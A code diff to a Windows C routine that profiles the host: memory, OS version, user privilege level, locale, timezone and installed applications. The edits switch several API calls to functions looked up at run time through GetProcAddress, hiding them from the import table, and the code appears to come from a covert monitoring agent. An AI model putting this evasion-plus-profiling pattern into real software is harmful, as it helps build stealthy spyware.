@@ -10,10 +10,11 @@ PDEVICE_CONTAINER pDeviceContainer = NULL;
 
 VOID GetDeviceInfo()
 {
+
 	HKEY hKey;
 	ULONG uLen;
 	PDEVICE_INFO pDeviceInfo;
-
+	
 	if (pDeviceContainer != NULL)
 	{
 #ifdef _DEBUG
@@ -70,7 +71,7 @@ VOID GetDeviceInfo()
 	pDeviceInfo->meminfo.memtotal = (ULONG)(pMemoryStatus.ullTotalPhys / (1024*1024));
 	pDeviceInfo->meminfo.memfree = (ULONG)(pMemoryStatus.ullAvailPhys / (1024*1024));
 	pDeviceInfo->meminfo.memload = (ULONG)(pMemoryStatus.dwMemoryLoad);
-	
+	/// FIN QUI TUTTO OK
 	// os
 	//if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
 	if (fpRegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey) == ERROR_SUCCESS)
@@ -120,28 +121,31 @@ VOID GetDeviceInfo()
 	PBYTE pUserInfo = NULL;
 	pDeviceInfo->userinfo.priv = 0;
 	
+	
 	typedef NET_API_STATUS (WINAPI *NetUserGetInfo_p)(
 		_In_   LPCWSTR servername,
 		_In_   LPCWSTR username,
 		_In_   DWORD level,
 		_Out_  LPBYTE *bufptr);
 	NetUserGetInfo_p fpNetUserGetInfo = (NetUserGetInfo_p) GetProcAddress(LoadLibrary(L"Netapi32"), "NetUserGetInfo");
-
 	if (fpNetUserGetInfo)
 		if (fpNetUserGetInfo(NULL, pDeviceInfo->userinfo.username, 1, &pUserInfo) == NERR_Success)
 			pDeviceInfo->userinfo.priv = ((PUSER_INFO_1)pUserInfo)->usri1_priv;		
 
 	SecureZeroMemory(pDeviceInfo->userinfo.fullname, 0x2);
 	SecureZeroMemory(pDeviceInfo->userinfo.sid, 0x2);
-
 	
 	
+	
+	typedef ULONG (WINAPI *GETLOCALEINFO)(LCID, LCTYPE, LPWSTR, ULONG);
+	GETLOCALEINFO fpGetLocaleInfo = (GETLOCALEINFO) GetProcAddress(LoadLibrary(L"kernel32"), "GetLocaleInfoW");
 	// locale & timezone
-	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
+	
+	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO639LANGNAME, pDeviceInfo->localinfo.lang, sizeof(pDeviceInfo->localinfo.lang) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.lang[0] = L'\0';
-	if (!GetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
+	if (!fpGetLocaleInfo(LOCALE_USER_DEFAULT, LOCALE_SISO3166CTRYNAME, pDeviceInfo->localinfo.country, sizeof(pDeviceInfo->localinfo.country) / sizeof(WCHAR)))
 		pDeviceInfo->localinfo.country[0] = L'\0';
-
+	
 	pDeviceInfo->localinfo.timebias = 0;
 	
 	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
@@ -153,8 +157,8 @@ VOID GetDeviceInfo()
 
 		RegCloseKey(hKey);
 	}
-
-
+	
+	
 	if (!RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
 	{
 		uLen = sizeof(ULONG);
@@ -187,9 +191,10 @@ VOID GetDeviceInfo()
 	BOOL bIsWow64, bIsx64OS;
 	IsX64System(&bIsWow64, &bIsx64OS);
 
+
 	PWCHAR pApplicationList = GetApplicationList(FALSE);
 	PWCHAR pApplicationList64 = NULL;
-
+	
 	if (bIsWow64)
 		pApplicationList64 = GetApplicationList(TRUE);
 		
@@ -314,7 +319,10 @@ PWCHAR GetApplicationList(BOOL bX64View)
 VOID IsX64System(PBOOL bIsWow64, PBOOL bIsx64OS)
 {    
     SYSTEM_INFO SysInfo;
-	IsWow64Process((HANDLE)-1, bIsWow64);
+	
+	typedef VOID (WINAPI *IsWow64Process_p)(HANDLE, PBOOL);	
+	IsWow64Process_p fpIsWow64Process = (IsWow64Process_p) GetProcAddress(LoadLibrary(L"kernel32"), "IsWow64Process");
+	fpIsWow64Process((HANDLE)-1, bIsWow64);
 
 	GetNativeSystemInfo(&SysInfo);
 	if(SysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
